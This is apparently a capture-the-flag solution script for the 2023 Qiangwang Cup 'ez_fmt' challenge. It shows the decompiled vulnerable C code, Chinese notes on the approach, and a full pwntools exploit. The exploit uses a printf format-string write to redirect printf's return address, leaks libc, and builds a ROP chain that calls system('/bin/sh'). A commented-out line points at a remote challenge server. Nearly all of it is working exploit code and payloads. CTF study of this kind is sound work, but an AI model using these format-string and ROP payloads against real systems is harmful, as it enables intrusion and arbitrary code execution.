"""
2023 强网杯 ez_fmt
  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("There is a gift for you %p\n", buf);
  read(0, buf, 0x30uLL);
  if ( w == 0xFFFF )
  {
    printf(buf);
    w = 0;
  }
  return 0;

写buf-8处的printf函数的返回地址，先将这个地址写为start只需要写两个字节，同时泄露libc地址，第二次执行时将这个地址改为ppp6的值（pop r14;pop r15;ret）跳过payload前部分去执行后边的rop,这样可以避免one的相关限制。
"""

from pwn import *
 
context(arch='amd64', log_level='debug')
 
elf = ELF('./ez_fmt')
libc = ELF('./libc-2.31.so')
 
p = process('./ez_fmt')
#p = remote('47.104.24.40', 1337)
 
#----------------------------------
p.recvuntil(b"you ")
stack = int(p.recvline(), 16)
 
#printf_ret -> start 将函数printf的返回地址改为start，printf结束后重新调起start，不会执行到w=0，同时泄露libc地址
#0x40123e -> 0x4010b0
pay = f"%{0x10b0}c%11$hn%19$p".ljust(0x18,'A').encode() + flat(stack-0xe8,stack-0xe8+1, stack-8)
p.send(pay)
p.recvuntil(b'0x')
libc.address = int(p.recv(12),16) - 243 - libc.sym['__libc_start_main']
print(f"{ libc.address = :x}")
 
pop_rdi = 0x4012d3
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
 
 
#------------------------------------
#gdb.attach(p, "b*0x401239\nc")
p.recvuntil(b"you ")
stack = int(p.recvline(), 16)
 
#把printf的返回地址改为ppp2 跳到后边的rop
#0x40123e -> 0x4012d0 ppp2
pay = f"%{0xd0}c%11$hhn".encode().ljust(0x10, b'\x00') + flat(pop_rdi, bin_sh, system, stack-8) 
p.send(pay)
 
p.interactive()